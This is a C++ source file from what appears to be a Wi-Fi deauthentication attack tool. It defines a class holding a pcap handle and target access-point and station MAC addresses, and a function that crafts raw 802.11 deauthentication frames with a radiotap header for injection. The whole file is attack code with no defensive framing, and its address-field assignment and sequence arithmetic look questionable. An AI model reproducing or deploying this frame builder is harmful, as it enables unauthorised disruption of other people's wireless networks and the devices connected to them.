#include "pch.h"
#include "deauth.h"

DeauthPkt::DeauthPkt(pcap_t* pcap, const Mac& apMac, const Mac& stMac, bool authMode) :
    pcap_(pcap),
    apMac_(apMac),
    stMac_(stMac),
    authMode_(authMode) {}

std::vector<uint8_t> DeauthPkt::createDeauth(const Mac& src, const Mac& dst, const Mac& bssid, uint16_t seq) {
    std::vector<uint8_t> pkt(sizeof(RadiotapHdr) + sizeof(Dot11Deauth));
    size_t offset = 0;

    RadiotapHdr rthdr = createMinimalRt();
    memcpy(pkt.data() + offset, &rthdr, sizeof(rthdr));
    offset += sizeof(rthdr);

    Dot11Deauth deauth{};
    deauth.hdr.fc = FC_DEAUTH;
    deauth.hdr.duration = 0x0130;    // 304us
    
    deauth.hdr.addr_1 = src;
    deauth.hdr.addr_2 = dst;
    deauth.hdr.addr_3 = bssid;

    deauth.hdr.seq = (deauth.hdr.seq | seq) << 4;
    deauth.reason = REASON_CLASS3;

    memcpy(pkt.data() + offset, &deauth, sizeof(deauth));
    return pkt;
}